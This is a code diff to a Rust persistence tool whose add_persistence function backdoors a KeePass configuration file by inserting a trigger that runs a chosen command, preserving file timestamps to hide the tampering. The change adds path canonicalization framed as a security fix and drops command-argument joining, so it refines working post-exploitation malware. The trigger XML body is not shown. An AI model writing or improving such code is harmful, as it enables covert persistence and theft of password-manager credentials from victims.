@@ -52,6 +52,11 @@ fn add_persistence(config: &PersistConfig) -> Result<()> {
         )));
     }
 
+    // Canonicalize path to prevent path traversal attacks
+    let canonical_path = path.canonicalize().map_err(|e| {
+        PersistError::InvalidInput(format!("Invalid file path: {}", e))
+    })?;
+
     // Check if KeePass is running (simplified check)
     if is_keepass_running() {
         return Err(PersistError::OperationFailed(
@@ -61,7 +66,7 @@ fn add_persistence(config: &PersistConfig) -> Result<()> {
     }
 
     // Read file contents
-    let contents = fs::read_to_string(path)?;
+    let contents = fs::read_to_string(&canonical_path)?;
 
     // Verify it's a KeePass config
     if !contents.contains("TriggerSystem") {
@@ -72,24 +77,18 @@ fn add_persistence(config: &PersistConfig) -> Result<()> {
 
     // Get file metadata for timestamp preservation
     #[cfg(target_os = "windows")]
-    let metadata = fs::metadata(path)?;
+    let metadata = fs::metadata(&canonical_path)?;
 
     // Create backup
     let backup_path = format!("{}.bak", file_path);
-    fs::copy(path, &backup_path)?;
+    fs::copy(&canonical_path, &backup_path)?;
 
     // Preserve timestamps on backup
     #[cfg(target_os = "windows")]
     preserve_timestamps(&backup_path, &metadata)?;
 
-    // Build command with arguments
-    let full_command = if let Some(args) = &config.command_arg {
-        format!("{} {}", command, args)
-    } else {
-        command.clone()
-    };
-
     // Create backdoor content
+    // Note: KeePass XML format expects command and arguments as separate parameters
     let backdoor_content = format!(
         r#"
             <Triggers>
@@ -129,7 +128,7 @@ fn add_persistence(config: &PersistConfig) -> Result<()> {
     let backdoored_contents = contents.replace("<Triggers />", &backdoor_content);
 
     // Write backdoored config
-    fs::write(path, backdoored_contents)?;
+    fs::write(&canonical_path, backdoored_contents)?;
 
     // Preserve original timestamps
     #[cfg(target_os = "windows")]
